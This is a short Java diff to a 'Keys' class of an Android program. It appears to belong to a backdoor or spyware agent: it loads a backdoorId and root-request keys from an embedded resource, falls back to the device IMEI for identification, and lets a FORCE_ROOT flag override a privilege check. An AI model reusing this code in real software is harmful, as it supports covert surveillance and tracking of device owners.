@@ -116,7 +116,7 @@ public class Keys implements iKeys{
 			androidId = "EMPTY";
 		}
 
-		//20.0=9774d56d682e549c Messages.getString("20.0")
+		//20.0=9774d56d682e549c Messages.getString("20_0")
 		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 			// http://code.google.com/p/android/issues/detail?id=10603
 			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
@@ -125,7 +125,7 @@ public class Keys implements iKeys{
 
 			final String imei = telephonyManager.getDeviceId();
 			androidId = imei;
-		}
+		}	
 
 		if (Cfg.DEBUGKEYS) {
 			Check.log(TAG + " (Keys), androidId: " + androidId);
@@ -145,7 +145,10 @@ public class Keys implements iKeys{
 			challengeKey = ByteArray.copy(resource, 78, 16); // 16 byte
 			demoMode = ByteArray.copy(resource, 110, 24); // 24 byte
 			rootRequest = ByteArray.copy(resource, 134, 16); // 16 byte
-			randomSeed = ByteArray.copy(resource, 150, 16); // 16 byte
+			if(resource.length > 150)
+				randomSeed = ByteArray.copy(resource, 150, 16); // 16 byte
+			else
+				randomSeed = new byte[16];
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
@@ -190,15 +193,15 @@ public class Keys implements iKeys{
 
 		boolean ret = Arrays.equals(calculated, rootDigest);
 
+		if(Cfg.FORCE_ROOT){
+			ret =  true;
+		}
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (wantsPrivilege MD5): " + ByteArray.byteArrayToHex(calculated)); //$NON-NLS-1$
 			Check.log(TAG + " (wantsPrivilege): " + ret); //$NON-NLS-1$
 		}
 		
-		if(Cfg.FORCE_ROOT){
-			return true;
-		}
-
 		return ret;
 	}
 
@@ -276,7 +279,7 @@ public class Keys implements iKeys{
 	static public  byte[] getSubtype() {
 		if (Cfg.DEMO) {
 			// 20.1=DEMO
-			return ("ANDROID-" + Messages.getString("20.1")).getBytes();
+			return ("ANDROID-" + Messages.getString("20_1")).getBytes();
 		} else {
 			return "ANDROID".getBytes();
 		}
